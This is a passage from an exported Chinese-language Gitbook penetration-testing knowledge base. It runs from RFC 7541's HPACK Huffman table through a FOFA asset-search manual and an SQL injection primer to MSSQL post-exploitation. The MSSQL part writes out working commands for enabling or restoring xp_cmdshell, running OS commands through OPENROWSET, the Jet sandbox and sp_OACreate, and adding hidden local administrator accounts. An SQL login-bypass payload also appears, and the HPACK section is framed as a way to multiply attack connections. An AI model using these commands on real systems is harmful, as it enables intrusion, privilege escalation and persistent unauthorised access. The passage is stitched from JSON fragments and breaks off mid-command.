'!' ( 33) |11111110|00 3f8 [10] '\"' ( 34) |11111110|01 3f9 [10] '#' ( 35) |11111111|1010 ffa [12] '$' ( 36) |11111111|11001 1ff9 [13] '%' ( 37) |010101 15 [ 6] '&' ( 38) |11111000 f8 [ 8] ''' ( 39) |11111111|010 7fa [11] '(' ( 40) |11111110|10 3fa [10] ')' ( 41) |11111110|11 3fb [10] '*' ( 42) |11111001 f9 [ 8] '+' ( 43) |11111111|011 7fb [11] ',' ( 44) |11111010 fa [ 8] '-' ( 45) |010110 16 [ 6] '.' ( 46) |010111 17 [ 6] '/' ( 47) |011000 18 [ 6] '0' ( 48) |00000 0 [ 5] '1' ( 49) |00001 1 [ 5] '2' ( 50) |00010 2 [ 5] '3' ( 51) |011001 19 [ 6] '4' ( 52) |011010 1a [ 6] '5' ( 53) |011011 1b [ 6] '6' ( 54) |011100 1c [ 6] '7' ( 55) |011101 1d [ 6] '8' ( 56) |011110 1e [ 6] '9' ( 57) |011111 1f [ 6] ':' ( 58) |1011100 5c [ 7] ';' ( 59) |11111011 fb [ 8] '' ( 62) |11111111|1011 ffb [12] '?' ( 63) |11111111|00 3fc [10] '@' ( 64) |11111111|11010 1ffa [13] 'A' ( 65) |100001 21 [ 6] 'B' ( 66) |1011101 5d [ 7] 'C' ( 67) |1011110 5e [ 7] 'D' ( 68) |1011111 5f [ 7] 'E' ( 69) |1100000 60 [ 7] 'F' ( 70) |1100001 61 [ 7] 'G' ( 71) |1100010 62 [ 7] 'H' ( 72) |1100011 63 [ 7] 'I' ( 73) |1100100 64 [ 7] 'J' ( 74) |1100101 65 [ 7] 'K' ( 75) |1100110 66 [ 7] 'L' ( 76) |1100111 67 [ 7] 'M' ( 77) |1101000 68 [ 7] 'N' ( 78) |1101001 69 [ 7] 'O' ( 79) |1101010 6a [ 7] 'P' ( 80) |1101011 6b [ 7] 'Q' ( 81) |1101100 6c [ 7] 'R' ( 82) |1101101 6d [ 7] 'S' ( 83) |1101110 6e [ 7] 'T' ( 84) |1101111 6f [ 7] 'U' ( 85) |1110000 70 [ 7] 'V' ( 86) |1110001 71 [ 7] 'W' ( 87) |1110010 72 [ 7] 'X' ( 88) |11111100 fc [ 8] 'Y' ( 89) |1110011 73 [ 7] 'Z' ( 90) |11111101 fd [ 8] '[' ( 91) |11111111|11011 1ffb [13] '\\' ( 92) |11111111|11111110|000 7fff0 [19] ']' ( 93) |11111111|11100 1ffc [13] '^' ( 94) |11111111|111100 3ffc [14] '_' ( 95) |100010 22 [ 6] '`' ( 96) |11111111|1111101 7ffd [15] 'a' ( 97) |00011 3 [ 5] 'b' ( 98) |100011 23 [ 6] 'c' ( 99) |00100 4 [ 5] 'd' (100) |100100 24 [ 6] 'e' (101) |00101 5 [ 5] 'f' (102) |100101 25 [ 6] 'g' (103) |100110 26 [ 6] 'h' (104) |100111 27 [ 6] 'i' (105) |00110 6 [ 5] 'j' (106) |1110100 74 [ 7] 'k' (107) |1110101 75 [ 7] 'l' (108) |101000 28 [ 6] 'm' (109) |101001 29 [ 6] Peon & Ruellan Standards Track [Page 29] RFC 7541 HPACK May 2015 'n' (110) |101010 2a [ 6] 'o' (111) |00111 7 [ 5] 'p' (112) |101011 2b [ 6] 'q' (113) |1110110 76 [ 7] 'r' (114) |101100 2c [ 6] 's' (115) |01000 8 [ 5] 't' (116) |01001 9 [ 5] 'u' (117) |101101 2d [ 6] 'v' (118) |1110111 77 [ 7] 'w' (119) |1111000 78 [ 7] 'x' (120) |1111001 79 [ 7] 'y' (121) |1111010 7a [ 7] 'z' (122) |1111011 7b [ 7] '{' (123) |11111111|1111110 7ffe [15] '|' (124) |11111111|100 7fc [11] '}' (125) |11111111|111101 3ffd [14] '~' (126) |11111111|11101 1ffd [13] (127) |11111111|11111111|11111111|1100 ffffffc [28] (128) |11111111|11111110|0110 fffe6 [20] (129) |11111111|11111111|010010 3fffd2 [22] (130) |11111111|11111110|0111 fffe7 [20] (131) |11111111|11111110|1000 fffe8 [20] (132) |11111111|11111111|010011 3fffd3 [22] (133) |11111111|11111111|010100 3fffd4 [22] (134) |11111111|11111111|010101 3fffd5 [22] (135) |11111111|11111111|1011001 7fffd9 [23] (136) |11111111|11111111|010110 3fffd6 [22] (137) |11111111|11111111|1011010 7fffda [23] (138) |11111111|11111111|1011011 7fffdb [23] (139) |11111111|11111111|1011100 7fffdc [23] (140) |11111111|11111111|1011101 7fffdd [23] (141) |11111111|11111111|1011110 7fffde [23] (142) |11111111|11111111|11101011 ffffeb [24] (143) |11111111|11111111|1011111 7fffdf [23] (144) |11111111|11111111|11101100 ffffec [24] (145) |11111111|11111111|11101101 ffffed [24] (146) |11111111|11111111|010111 3fffd7 [22] (147) |11111111|11111111|1100000 7fffe0 [23] (148) |11111111|11111111|11101110 ffffee [24] (149) |11111111|11111111|1100001 7fffe1 [23] (150) |11111111|11111111|1100010 7fffe2 [23] (151) |11111111|11111111|1100011 7fffe3 [23] (152) |11111111|11111111|1100100 7fffe4 [23] (153) |11111111|11111110|11100 1fffdc [21] (154) |11111111|11111111|011000 3fffd8 [22] (155) |11111111|11111111|1100101 7fffe5 [23] (156) |11111111|11111111|011001 3fffd9 [22] (157) |11111111|11111111|1100110 7fffe6 [23] Peon & Ruellan Standards Track [Page 30] RFC 7541 HPACK May 2015 (158) |11111111|11111111|1100111 7fffe7 [23] (159) |11111111|11111111|11101111 ffffef [24] (160) |11111111|11111111|011010 3fffda [22] (161) |11111111|11111110|11101 1fffdd [21] (162) |11111111|11111110|1001 fffe9 [20] (163) |11111111|11111111|011011 3fffdb [22] (164) |11111111|11111111|011100 3fffdc [22] (165) |11111111|11111111|1101000 7fffe8 [23] (166) |11111111|11111111|1101001 7fffe9 [23] (167) |11111111|11111110|11110 1fffde [21] (168) |11111111|11111111|1101010 7fffea [23] (169) |11111111|11111111|011101 3fffdd [22] (170) |11111111|11111111|011110 3fffde [22] (171) |11111111|11111111|11110000 fffff0 [24] (172) |11111111|11111110|11111 1fffdf [21] (173) |11111111|11111111|011111 3fffdf [22] (174) |11111111|11111111|1101011 7fffeb [23] (175) |11111111|11111111|1101100 7fffec [23] (176) |11111111|11111111|00000 1fffe0 [21] (177) |11111111|11111111|00001 1fffe1 [21] (178) |11111111|11111111|100000 3fffe0 [22] (179) |11111111|11111111|00010 1fffe2 [21] (180) |11111111|11111111|1101101 7fffed [23] (181) |11111111|11111111|100001 3fffe1 [22] (182) |11111111|11111111|1101110 7fffee [23] (183) |11111111|11111111|1101111 7fffef [23] (184) |11111111|11111110|1010 fffea [20] (185) |11111111|11111111|100010 3fffe2 [22] (186) |11111111|11111111|100011 3fffe3 [22] (187) |11111111|11111111|100100 3fffe4 [22] (188) |11111111|11111111|1110000 7ffff0 [23] (189) |11111111|11111111|100101 3fffe5 [22] (190) |11111111|11111111|100110 3fffe6 [22] (191) |11111111|11111111|1110001 7ffff1 [23] (192) |11111111|11111111|11111000|00 3ffffe0 [26] (193) |11111111|11111111|11111000|01 3ffffe1 [26] (194) |11111111|11111110|1011 fffeb [20] (195) |11111111|11111110|001 7fff1 [19] (196) |11111111|11111111|100111 3fffe7 [22] (197) |11111111|11111111|1110010 7ffff2 [23] (198) |11111111|11111111|101000 3fffe8 [22] (199) |11111111|11111111|11110110|0 1ffffec [25] (200) |11111111|11111111|11111000|10 3ffffe2 [26] (201) |11111111|11111111|11111000|11 3ffffe3 [26] (202) |11111111|11111111|11111001|00 3ffffe4 [26] (203) |11111111|11111111|11111011|110 7ffffde [27] (204) |11111111|11111111|11111011|111 7ffffdf [27] (205) |11111111|11111111|11111001|01 3ffffe5 [26] Peon & Ruellan Standards Track [Page 31] RFC 7541 HPACK May 2015 (206) |11111111|11111111|11110001 fffff1 [24] (207) |11111111|11111111|11110110|1 1ffffed [25] (208) |11111111|11111110|010 7fff2 [19] (209) |11111111|11111111|00011 1fffe3 [21] (210) |11111111|11111111|11111001|10 3ffffe6 [26] (211) |11111111|11111111|11111100|000 7ffffe0 [27] (212) |11111111|11111111|11111100|001 7ffffe1 [27] (213) |11111111|11111111|11111001|11 3ffffe7 [26] (214) |11111111|11111111|11111100|010 7ffffe2 [27] (215) |11111111|11111111|11110010 fffff2 [24] (216) |11111111|11111111|00100 1fffe4 [21] (217) |11111111|11111111|00101 1fffe5 [21] (218) |11111111|11111111|11111010|00 3ffffe8 [26] (219) |11111111|11111111|11111010|01 3ffffe9 [26] (220) |11111111|11111111|11111111|1101 ffffffd [28] (221) |11111111|11111111|11111100|011 7ffffe3 [27] (222) |11111111|11111111|11111100|100 7ffffe4 [27] (223) |11111111|11111111|11111100|101 7ffffe5 [27] (224) |11111111|11111110|1100 fffec [20] (225) |11111111|11111111|11110011 fffff3 [24] (226) |11111111|11111110|1101 fffed [20] (227) |11111111|11111111|00110 1fffe6 [21] (228) |11111111|11111111|101001 3fffe9 [22] (229) |11111111|11111111|00111 1fffe7 [21] (230) |11111111|11111111|01000 1fffe8 [21] (231) |11111111|11111111|1110011 7ffff3 [23] (232) |11111111|11111111|101010 3fffea [22] (233) |11111111|11111111|101011 3fffeb [22] (234) |11111111|11111111|11110111|0 1ffffee [25] (235) |11111111|11111111|11110111|1 1ffffef [25] (236) |11111111|11111111|11110100 fffff4 [24] (237) |11111111|11111111|11110101 fffff5 [24] (238) |11111111|11111111|11111010|10 3ffffea [26] (239) |11111111|11111111|1110100 7ffff4 [23] (240) |11111111|11111111|11111010|11 3ffffeb [26] (241) |11111111|11111111|11111100|110 7ffffe6 [27] (242) |11111111|11111111|11111011|00 3ffffec [26] (243) |11111111|11111111|11111011|01 3ffffed [26] (244) |11111111|11111111|11111100|111 7ffffe7 [27] (245) |11111111|11111111|11111101|000 7ffffe8 [27] (246) |11111111|11111111|11111101|001 7ffffe9 [27] (247) |11111111|11111111|11111101|010 7ffffea [27] (248) |11111111|11111111|11111101|011 7ffffeb [27] (249) |11111111|11111111|11111111|1110 ffffffe [28] (250) |11111111|11111111|11111101|100 7ffffec [27] (251) |11111111|11111111|11111101|101 7ffffed [27] (252) |11111111|11111111|11111101|110 7ffffee [27] (253) |11111111|11111111|11111101|111 7ffffef [27] Peon & Ruellan Standards Track [Page 32] RFC 7541 HPACK May 2015 (254) |11111111|11111111|11111110|000 7fffff0 [27] (255) |11111111|11111111|11111011|10 3ffffee [26] EOS (256) |11111111|11111111|11111111|111111 3fffffff [30] 参照 RFC7541 ，如果H为0，则编码数据是字符串文字的原始八位字节。 如果H是1，则编码数据是字符串文字的哈夫曼编码： 根据 RFC7541 给出的哈夫曼编码译表，我们需要关注的是最后一行的 length bit ，也就是编码的长度： 可见，最短的编码长度是 5 bit，将5位的字符整理出来后是： 0 | 1 | 2 | a | c | e | i | o | s | t | 我们现在用5位的短字符来替换原来的8位长字符，这样就实现了客户端请求的压缩： 这样，当我们针对同一网站不同资源做第一次动态表记录请求时，就极大幅度的缩小了自身请求的消耗，从而节约出机器资源，来发起更多的攻击连接。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 21:42:39 "},"知识库/01.WEB安全/00.信息收集/3.网络空间搜索引擎使用手册/":{"url":"知识库/01.WEB安全/00.信息收集/3.网络空间搜索引擎使用手册/","title":"3.网络空间搜索引擎使用手册","keywords":"","body":"PDF转WORD再转markdown太丑了，而且格式也会乱掉，所以这里直接放PDF的访问链接吧。 ‼️直接点如果没反应，就右键，然后新建标签页打开即可‼️ FOFA使用手册--修订版 shodan使用手册--修订版 Zoomeye使用手册-修订版 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 21:42:55 "},"知识库/01.WEB安全/00.信息收集/3.网络空间搜索引擎使用手册/FOFA使用手册.html":{"url":"知识库/01.WEB安全/00.信息收集/3.网络空间搜索引擎使用手册/FOFA使用手册.html","title":"FOFA使用手册","keywords":"","body":"介绍 随着网络安全的普及，黑客的攻击手段也日新月异，越来越多的企业对网络安全产品与服务的需求有了新的变化。那么，在险象丛生的互联网世界之中企业如何能够更加有效的保护自己的网络空间资产呢？FOFA给出了相应的解决方案。与传统扫描相比，企业更需要一款能够根据特征、检索条件迅速进行全网资产匹配的搜索引擎。“佛法无边”通常比喻神通广大，无所不能，企业用户终于可以安心的“抱佛脚”了，FOFA可以迅速进行网站资产匹配，加快后续工作进程，如漏洞影响范围分析，应用分布统计，应用流行度排名统计等。 什么是FOFA FOFA（网络空间资产检索系统）是世界上数据覆盖更完整的IT设备搜索引擎，拥有全球联网IT设备更全的DNA信息。探索全球互联网的资产信息，进行资产及漏洞影响范围分析、应用分布统计、应用流行度态势感知等。 什么是F币 F币，全称FOFA币，是由FOFA推出的一种虚拟货币。通常它的兑价是1F币=10人民币，用于下载数据一般都是1F币=30元，充值6个以上（含6个）是6.7折，充值20个以上（含20个）是5折。 它可以用来下载数据：10000条数据/1F币；也可以调用API查询数据：10000条数据/1F币。 什么时候能用到FOFA • 我想知道我司产品在互联网的部署情况？ • 如何获取一个根域名所有子域名网站？如何根据IP确认企业？ • 如何根据一个子域名网站找到跟他在一个IP的其他网站？ • 全网漏洞扫描，一个新的漏洞全网的影响范围。 FOFA具备哪些优势 • 包括标签在内的HTML代码级全文索引和检索，其检索内容更丰富，效果更快速、更精准 • 预置超过50000条产品特征规则，且用户可以随时自行动态增加，灵活度更高 • 深厚的全网数据积累，同高效的数据检索技术，快速提高用户的网络资产发现能力 • 实际应用场景中稳定运行超过4年，成功部署于各类企业用户的生产环境中，发挥重要作用 会员权益 成为FOFA会员可免费查询海量的数据，并拥有稳定的数据资源及丰富的API接口，目前FOFA会员分普通会员和高级会员，是终身会员。各等级会员区分如下： https://fofa.so/static_pages/vip 查询语法 FOFA作为一个搜索引擎，我们要熟悉它的查询语法，类似google语法，FOFA的语法也是简单易懂，主要分为检索字段以及运算符，所有的查询语句都是由这两种元素组成的。 直接输入查询语句，将从标题，html内容，http头信息，url字段中搜索 从标题中搜索“北京” title=\"beijing\" 从http头中搜索“elastic” header=\"elastic\" 从html正文中搜索“网络空间测绘” body=\"网络空间测绘\" 搜索根域名带有qq.com的网站 domain=\"qq.com\" 查找备案号为“京ICP证030173号”的网站 icp=\"京ICP证030173号\" 查找网站正文中包含js/jquery.js的资产 js_name=\"js/jquery.js\" 查找js源码与之匹配的资产 js_md5=\"82ac3f14327a8b7ba49baa208d4eaa15\" 搜索使用此icon的资产。 icon_hash=\"-247388890\" 从url中搜索”.gov.cn” host=\".gov.cn\" 查找对应“6379”端口的资产 port=\"6379\" 从ip中搜索包含“1.1.1.1”的网站 ip=\"1.1.1.1\" 查询IP为“220.181.111.1”的C网段资产 ip=\"220.181.111.1/24\" 查询服务器状态为“402”的资产 status_code=\"402\" 查询quic协议资产 protocol=\"quic\" 搜索指定国家(编码)的资产。 country=\"CN\" 搜索指定行政区的资产。 region=\"Xinjiang\" 搜索指定城市的资产。 city=\"Kunming\" 搜索证书(https或者imaps等)中带有baidu的资产。 cert=\"baidu\" 搜索证书持有者是Oracle Corporation的资产 cert.subject=\"Oracle Corporation\" 搜索证书颁发者为DigiCert Inc的资产 cert.issuer=\"DigiCert\" 验证证书是否有效，true有效，false无效 cert.is_valid=true 搜索FTP协议中带有users文本的资产。 banner=users && protocol=ftp 搜索所有协议资产，支持subdomain和service两种 type=service 搜索CentOS资产。 os=\"centos\" 搜索IIS 10服务器。 server==\"Microsoft-IIS/10\" 搜索Microsoft-Exchange设备 app=\"Microsoft-Exchange\" 时间范围段搜索 after=\"2021\" && before=\"2021-06-01\" 搜索指定asn的资产。 asn=\"19551\" 搜索指定org(组织)的资产。 org=\"Amazon.com, Inc.\" 搜索指定udp协议的资产。 base_protocol=\"udp\" 排除仿冒/欺诈数据 is_fraud=false 排除蜜罐数据 is_honeypot=false 搜索ipv6的资产 is_ipv6=true 搜索域名的资产 is_domain=true 查询开放端口数量等于\"6\"的资产 port_size=\"6\" 查询开放端口数量大于\"6\"的资产 port_size_gt=\"6\" 查询开放端口数量小于\"12\"的资产 port_size_lt=\"12\" 搜索同时开放80和161端口的ip ip_ports=\"80,161\" 搜索中国的ip资产(以ip为单位的资产数据)。 ip_country=\"CN\" 搜索指定行政区的ip资产(以ip为单位的资产数据)。 ip_region=\"Zhejiang\" 搜索指定城市的ip资产(以ip为单位的资产数据)。 ip_city=\"Hangzhou\" 搜索2021-03-18以后的ip资产(以ip为单位的资产数据)。 ip_after=\"2021-03-18\" 搜索2019-09-09以前的ip资产(以ip为单位的资产数据)。 ip_before=\"2019-09-09\" 注释 查询过程中，可通过点击左侧栏中的分类进行辅助查询，会自动构建对应的查询语句。 高级搜索 逻辑运算符 如果查询表达式有多个与或关系，尽量在外面用（）包含起来 逻辑运算符 说明 其他 && 与 同时满足 \\ \\ 或 满足其中一个 != 非 不等于 == 等 全等 标题中包含powered by且标题中不包含discuz title=\"powered by\" && title!=discuz 标题中不包含powered by且html正文中包含discuz title!=\"powered by\" && body=discuz 寻找Wordpress搭建的站点且从url中搜索”.gov.cn” ( body=\"content=\\\"WordPress\" || (header=\"X-Pingback\" && header=\"/xmlrpc.php\" && body=\"/wp-includes/\") ) && host=\"gov.cn\" 排除干扰 使用规则is_honeypot=false && is_fraud=false可排除排除仿冒/欺诈数据和蜜罐数据 规则专题 https://fofa.so/subject 规则列表 FOFA可以从不同维度搜索网络组件，例如地区，端口号，网络服务，操作系统，网络协议等等。目前FOFA支持了多个网络组件的指纹识别，包括建站模块、分享模块、各种开发框架、安全监测平台、项目管理系统、企业管理系统、视频监控系统、站长平台、电商系统、广告联盟、前端库、路由器、SSL证书、服务器管理系统、CDN、Web服务器、WAF、CMS等等。 https://fofa.so/library API 通过API可快速从网站中获取数据，便于进行程序间的自动化查询、处理功能，进行进一步的业务分析， 所有调用都需要提供身份信息，主要是email和key，email主要是注册和登陆时填写的email，key需要用户到个人中心获取32位的hash值，即为API KEY。 将上面的两个信息填入api接口中，即可获取json格式的数据： 具体的使用如下： https://fofa.so/static_pages/api_help 下载功能 搜索到结果之后可在右侧选择下载功能，可下载搜索到的所有数据，下载的格式支持CSV，JSON格式，方便程序调用进行全网扫描。 数据统计 查询出的结果可通过图表的形式进行数据统计。 问题列表 icon_hash语法怎么使用 使用方法①：已有icon文件时，通过在首页搜索框内上传icon搜索； 使用方法②：已知icon_hash时直接使用icon_hash=””语法搜索； 使用方法③：已知域名时，使用domain=””语法，系统会展示对应的icon，点击即可进行搜索； port_size语法怎么使用 该语法仅限高级会员、企业会员使用。 通过port_size=””语法，可以查询开放端口数量等于某数的资产； 通过port_size_gt=””语法，可以查询开放端口数量大于某数的资产； 通过port_size_lt=””语法，可以查询开放端口数量小于某数的资产； API可以获取哪些字段？ host, title, ip, domain, port, country, province, city, country_name, header, server, protocol, banner, cert, isp, as_number, as_organization, latitude, longitude, lastupdatetime等。 能显示独立ip吗？ 支持，前往该IP的聚合页查看。 同IP数据重复 FOFA的资产是以ip和端口为单位，不是以ip为单位。所有存在同IP不同端口的数据。 同端口数据重复 端口数据分协议数据和网站数据。协议数据有协议等信息，网站数据有网站正文信息。 为何有的协议不支持跳转？ 只有https及http协议支持跳转。 是否可以识别组件的版本？ 公网暴露的信息中若存在版本特征，则可识别。 API接口调用查询的时间选项，有很多是以前的信息 搜索语法增加时间限制。 IP可以搜索到，Body中的内容搜索不到？ 英文中的. :// _等未做分词，搜索整体才能搜到，搜索一部分搜不到。 title支持模糊查询吗？ 单等号搜索为包含关系，双等号搜索为绝对相同关系。 Fofa采集工具 fofa_viewer https://github.com/wgpsec/fofa_viewer 多标签式查询结果展示 丰富的右键菜单 支持查询结果导出 支持手动修改查询最大条数，方便非高级会员使用(修改config.properties中的maxSize即可) 支持证书转换 将证书序列填写入启动页框内可转换，再使用 cert=\"计算出来的值\" 语法进行查询 支持输入智能提示 支持fofa的一键排除干扰（蜜罐）功能。（注：需要高级会员才能使用，使用时会在tab页标记(*)） Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 21:42:47 "},"知识库/01.WEB安全/01.SQLi/":{"url":"知识库/01.WEB安全/01.SQLi/","title":"01.SQLi","keywords":"","body":"定义 SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行未授权的任意查询，从而进一步得到相应的数据信息。 什么是SQL注入 简单的来说，SQL注入是开发者没有对用户的输入数据进行严格的限制/转义，致使用户在输入一些特定的字符时，在与后端设定的sql语句进行拼接时产生了歧义，使得用户可以控制该条sql语句与数据库进行通信。 简单举个例子 fetch_row()){ echo \"success\"; }else{ echo \"fail\"; } ?> 上述代码模拟web应用程序进行登录操作。若登录成功，则返回success，失败则返回fail 正常用户登录，sql语句如下： select * from users where username = '$username' and password='$password' 其中，变量$username 与变量$password为用户可以控制的内容，正常情况下，用户所输入的内容在sql语义上都将作为字符串，被赋值给字段来当做整条select查询语句的筛选条件。 若用户输入的$username为admin'-- ，$password为123。那么拼接到sql语句中将得到如下结果 select * from users where username = 'admin'-- ' and password='123' 这里的-- 是单行注释符，可以将'admin' 后面的内容给注释掉，让此条sql语句的语义发生变化，就算用户输入错误的密码，也可以完成登录操作，这就是我们常说的万能密码之一。 常见数据库 数据库包括关系型数据库和非关系型数据库，这两类数据库最主要的区别如下表所示 关系型数据库 非关系型数据库 特性 1. 采用了关系模型来组织数据的数据库2. 事务的一致性3.关系模型指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组成的一个数据组织 使用键值对存储数据；分布式；一般不支持ACID特性；非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合 优点 1.容易理解：二维表结构是非常贴近逻辑世界一个概念，关系模型相对网状、层次等其他模型来说更容易理解；2.使用方便：通用的SQL语言使得操作关系型数据库非常方便；3.易于维护：丰富的完整性(实体完整性、参照完整性和用户定义的完整性)大大减低了数据冗余和数据不一致的概率；4.支持SQL，可用于复杂的查询 1.无需经过sql层的解析，读写性能很高；2.无需经过sql层的解析，读写性能很高；3.基于键值对，数据没有耦合性，容易扩展；4.存储数据的格式：nosql的存储格式是key,value形式、文档形式、图片形式等等，文档形式、图片形式等等，而关系型数据库则只支持基础类型 缺点 1.为了维护一致性所付出的巨大代价就是其读写性能比较差；2.固定的表结构；3.高并发读写需求；4.海量数据的高效率读写； 1.不提供sql支持，学习和使用成本较高；2.无事务处理，附加功能bi和报表等支持也不好 常见的关系型数据库和非关系型数据库有如下几种，我们主要讨论关系型数据库的注入问题，非关系型数据库暂不讨论 关系型数据库 mysql Oracle postgresql mssql DB2 非关系型数据库 MongoDB Redis influxdb 。。。渗透的时候，如何判断数据库？ 方法 数据库 常用搭配 asp => mssql / access.net => mssqlphp => mysql,postgresqljava => mysql,oracle 默认端口 oracle => 1521mssql => 1433mysql => 3306postgresql => 5432 数据库特有函数 pg_sleep() => postgresqlbenchmark() => mysqlwaitfor delay => mssqlDBMS_PIPE.RECEIVE_MESSAGE() => oracle... 特殊符号 ; => 字句查询标识符，postgresql，mssql 默认可堆叠查询;# =>Mysql 注释符 特定表名 information_schema => mssql,postgresql,mysqlpg_tables => postgresqlsysobjects => mssqlall_tables,user_tables => oracle 报错banner信息 ... Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 14:02:10 "},"知识库/01.WEB安全/01.SQLi/MSSQL/MSSQL.html":{"url":"知识库/01.WEB安全/01.SQLi/MSSQL/MSSQL.html","title":"MSSQL","keywords":"","body":"MSSQL 简介 SQL Server是Microsoft开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的DBMS之一。SQL Server具有极其广泛的用途，它可以在各个方面使用,从存储个人博客的内容到存储客户数据等。 在2017版之前，SQL Server仅适用于Windows。 SQL Server 2017中最大的变化之一是，它现在可在Linux和Docker容器上使用。 这意味着可以在Mac上运行SQL Server。 SQL Server的可用版本 版本 描述 Enterprise Edition 此版本仅在Windows Server操作系统上运行。 适用于对速度和可用性具有较高优先级的大型生产数据库服务器。提供复制和联机分析过程（OLAP）服务等功能，这些服务可能会增加其安全风险。 Standard Edition 该版本与Enterprise Edition相似，但缺少虚拟接口系统局域网（VI SAN）支持和某些高级OLAP功能。 Personal Edition 它旨在用于工作站和便携式计算机，而不是服务器。 其设计最多支持五个数据库用户。 Developer Edition 面向开发人员版本，它与Enterprise Edition具有相似的功能，但并不意味着可以在真实的生产环境中运行。 客户端/服务器数据库系统 SQL Server是一个客户端/服务器数据库管理系统（DBMS）。 这允许有许多不同的客户端同时，全部连接到SQL Server。 这些客户端的每一个都可以通过不同的工具进行连接。 例如，一个客户端可能使用如SQL Server Management Studio（SSMS）之类的图形工具，而另一客户端可能使用诸如sqlcmd之类的命令行工具。 同时，网站也可以从Web应用程序连接到SQL Server。 并且可能有许多其他客户端都使用自己的工具出于自己的目的进行连接。 客户端/服务器DBMS的主要优点是多个用户可以同时访问它，每个用户都有特定的访问级别。如果数据库管理员配置对应的权限，则任何连接到SQL Server的客户端将只能访问他们被允许访问的数据库。 他们只能执行允许执行的任务。 所有这些都从SQL Server本身内部进行控制。 SQL Server是在服务帐户的上下文中在操作系统上运行的一组Windows服务。每次安装SQL Server实例时，实际上都会安装一组Windows服务并具有唯一的名称。现有的SQL Server帐户类型： Windows帐户。 SQL Server登录名（SQL Server内部）。 数据库用户（SQL Server内部）。 Windows帐户和SQL Server登录名用于登录SQL Server。除非系统管理员，否则必须将SQL Server登录名映射到数据库用户才能访问数据。数据库用户是在数据库级别内单独创建的。 SQL Server的常见角色是： Sysadmin角色：SQL Server管理员。 Public角色：最低特权，类似于Windows中的everyone组。 更多请参考：https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017基础知识 系统库 在每个网站中，一般一个网站不会跨库，而且在MSSQL中的每个库都有一个系统自带表：sysobjects 此信息表中对我们有用的只有3个字段，NAME,XTYPE,ID字段，name 表示表名，xtype 表示表的类型，id字段的值用来连接syscolumns表 sysobjects是一个系统视图，用于存放该数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，而xtype代表对象的类型。 类型简称 含义 U 表（用户定义类型） V 视图 P 存储过程 X 拓展存储过程 危险的存储过程 xp_cmdshell 查询xp_cmdshell存储过程是否存在 xtype为对象类型，xtype='x'，表示存储过程的对象类型为扩展存储过程。 select * from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell' 最为经典的就是这个组件了,但是2005之后就默认关闭,而且现在来说都会把这个扩展删除掉 激活命令 EXEC sp_configure 'show advanced options', 1; RECONFIGURE; exec SP_CONFIGURE 'xp_cmdshell', 1; RECONFIGURE; 相关问题 未能找到存储过程'master..xpcmdshell'. 恢复方法： EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll' declare @o int EXEC sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll' 无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。） 恢复方法： EXEC sp_dropextendedproc \"xp_cmdshell\" EXEC sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll' 无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。) 恢复方法： exec sp_dropextendedproc 'xp_cmdshell' exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll' SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 \"外围应用配置器\"。 恢复方法： EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; xp_dirtree 获取文件信息,可以列举出目录下所有的文件与文件夹 参数说明:目录名,目录深度,是否显示文件 execute master..xp_dirtree 'c:' execute master..xp_dirtree 'c:',1 execute master..xp_dirtree 'c:',1,1 OPENROWSET OPENROWSET 在MSSQL 2005及以上版本中默认是禁用的.需要先打开: 激活语句 EXEC sp_configure 'show advanced options', 1; exec sp_configure RECONFIGURE; exec SP_CONFIGURE 'Ad Hoc Distributed Queries', 1; exec sp_configure RECONFIGURE; SELECT * FROM OPENROWSET('SQLOLEDB', '数据库地址';'数据库用户名';'数据库密码', 'SET FMTONLY OFF execute master..xp_cmdshell \"dir\"'); 这种攻击是需要首先知道用户密码的 沙盒 开启沙盒： exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',1 执行命令: select * from openrowset('microsoft.jet.oledb.4.0',';database=c:windowssystem32iasdnary.mdb','select shell(\"whoami\")') SP_OACREATE 其实xp_cmdshell一般会删除掉了,如果xp_cmdshell 删除以后，可以使用SP_OACreate 需要注意的是这个组件是无回显的,你可以把他直接输出到web目录下的文件然后读取 激活命令 EXEC sp_configure 'show advanced options', 1; exec sp_configure RECONFIGURE; exec sp_configure 'Ole Automation Procedures', 1; exec sp_configure RECONFIGURE; 下面是收集来的sp_OACreate的一些命令: -- 1）直接加用户 -- 2000系统 declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\winnt\\system32\\cmd.exe /c net user 123 123 /add' declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\winnt\\system32\\cmd.exe /c net localgroup administrators 123/add' -- xp和2003系统： declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c net user 123$ 123/add' declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c net localgroup administrators 